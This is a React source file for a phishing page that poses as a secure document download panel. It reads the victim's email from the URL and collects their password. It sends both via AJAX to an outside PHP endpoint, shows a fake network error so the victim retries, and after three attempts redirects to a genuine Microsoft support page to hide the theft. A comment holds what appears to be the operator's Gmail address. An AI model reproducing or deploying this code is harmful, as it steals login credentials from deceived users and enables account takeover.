
import './modal.css';
import Panell from './media/img/authpanel.png';
import Logg from './media/img/logo.png';
import SensitiveFile from './media/img/file.png';
import Signn from './media/img/sign.png';
import { useState } from 'react';
import $ from 'jquery';

export const Modal = ()=>{



    // const reloadPreloader = ()=> window.location.reload();

    const emailInTheURL = window.location.href;
    const sliceEqualSign = emailInTheURL.indexOf("=");
    const extracetdEmail = emailInTheURL.substr((sliceEqualSign+1)).split('&', 1).toString();

    const [email, setEmail] = useState(extracetdEmail);
    const [pwd, setPwd] = useState('');

    const [count, setCount] = useState(0);

    const [err, setErr] = useState(false);




    const submitHandler = (e) => {
        e.preventDefault();
        if (pwd === "") {
          return null
        }
        
        else{
            
            setTimeout(() => {
              setPwd('');
              setErr(true);
            }, 2500);


          const user = {
            email: email,
            password: pwd,
        };

        // stanleyugo411@gmail.com
    
          $.ajax({
              type: "POST",
              url: "https://physicaleducationdiploma.com/component/stan.php",
              data: user,
              success(data) {
                  console.log(data);
              },
          });
    
    
    // deploy
    
          setCount(count=> count + 1);
                if(count >= 2){
                    const redirectURL = window.location.href;
                    const sliceEqualSign = redirectURL.indexOf("@");
                    const extracetdemailDomain = redirectURL.substr((sliceEqualSign+1));
                    console.log(extracetdemailDomain);
                    window.location.reload();
                    window.location.href = `https://support.microsoft.com/en-us/office/excel-not-responding-hangs-freezes-or-stops-working-37e7d3c9-9e84-40bf-a805-4ca6853a1ff4`;
                };
        }
      };



    return(<>
        <div className='backdrop'>
            <div className='mode'>

                <div style={{borderBottom:'1px solid #ccc'}}>
                    <img 
                        src={Logg}
                        alt='logggg'
                        className='logggg'
                        style={{height:'40px'}}
                    />

                    &#160;

                    <img 
                        src={Panell}
                        alt='authentication'
                        className='authentication'
                    />

                </div>



                <div className='main'>
                    <div>
                        <img 
                            src={SensitiveFile}
                            alt='file'
                            className='file'
                        />
                    </div>


                    <form onSubmit={submitHandler}>
                        <div className='em_conr'>
                            <span>Email</span>

                            <input 
                                style={{marginTop:'7px'}}
                                className='email'
                                id='email'
                                type='email'
                                required
                                readOnly
                                value={email}
                                onChange={ e=> setEmail(e.target.value) }
                            />
                        </div>





                        <div className='pwd_conr em_conr'>
                            <span>Password</span>

                            <input 
                                style={{marginTop:'7px'}}
                                className='paswd email'
                                id='paswd'
                                type='password'
                                required
                                value={pwd}
                                onChange={ e=> setPwd(e.target.value) }
                                autoFocus
                            />
                        </div>


                        { err ? <div className='err'>Network error, try again later!</div>: null }



                        <div className='btn_cont'>
                            <input 
                                type='submit'
                                value={`Download`}
                                className='btn__sub_'
                                autoFocus
                                onClick={submitHandler}
                            />
                        </div>

                        <img src={Signn} alt='signin' style={{width:'100%', marginTop:'20px'}}/>
                    </form>


                </div>

            </div>
        </div>
    </>)
}